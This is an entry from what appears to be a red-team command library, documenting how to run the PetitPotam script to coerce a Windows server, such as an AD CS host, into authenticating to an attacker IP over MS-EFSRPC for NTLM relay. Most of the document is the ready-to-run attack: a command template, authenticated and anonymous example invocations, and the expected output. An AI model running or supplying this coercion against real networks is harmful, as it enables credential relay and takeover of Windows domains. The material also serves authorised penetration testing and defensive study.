---
id: d4e5f6g7-h8i9-0123-defg-456789012345
name: python-petitpotam-coerce
type: command
executor: bash
data: >-
  python3 petitpotam.py -d $_DOMAIN -u $_USER -p $_PASSWORD $_ATTACKER_IP
  $_TARGET_IP
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
tags:
  - coercion
  - rpc
verified: true
validated: true
---

# python-petitpotam-coerce

## Command

```bash
python3 petitpotam.py -d $_DOMAIN -u $_USER -p $_PASSWORD $_ATTACKER_IP $_TARGET_IP
```

## Description

Executes the PetitPotam script to coerce a Windows target (e.g., AD CS server) to authenticate via MS-EFSRPC to the specified attacker IP, enabling NTLM relay attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | Yes |
| $_USER | Username for authenticated coercion (empty for anonymous) | No |
| $_PASSWORD | Password for authenticated coercion | No |
| $_ATTACKER_IP | IP where target will authenticate (relay server) | Yes |
| $_TARGET_IP | IP of the target server to coerce | Yes |

## Examples

### Authenticated Coercion

```bash
python3 petitpotam.py -d domain.com -u user -p pass 192.168.1.100 10.0.0.50
```

### Anonymous Coercion

```bash
python3 petitpotam.py -d domain.com '' '' 192.168.1.100 10.0.0.50
```

## Expected Output

Coercion confirmation:

[*] Target: 10.0.0.50
[*] Domain: domain.com
[*] Username: 
[*] Password: 
[*] Attacker IP: 192.168.1.100
[*] Sending EFSRPC open request
[*] Coercion sent successfully.

## Related

- [[procedures/MS-EFSRPC-Abuse-via-PetitPotam-and-Unconstrained-Delegation]]
- [[tools/PetitPotam]]
